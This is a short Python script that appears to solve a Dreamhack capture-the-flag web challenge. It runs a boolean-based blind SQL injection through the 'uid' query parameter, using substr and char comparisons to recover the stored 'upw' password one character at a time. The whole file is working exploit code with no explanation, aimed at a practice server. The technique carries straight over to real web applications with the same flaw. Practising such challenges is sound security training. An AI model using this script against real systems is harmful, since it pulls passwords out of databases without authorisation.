import requests
flag = 'DH{'

while(1):
    for i in range(32, 127):
        url = 'http://host1.dreamhack.games:12782/?uid=a%27||substr(upw,' + str(len(flag) + 1) + ',1)=char(' + str(i) + ');'
        res = requests.get(url)
        if 'admin' in res.text:
            flag = flag + chr(i).lower()
            print('[+] flag : ' + flag)
            break
    if '}' in flag:
        break
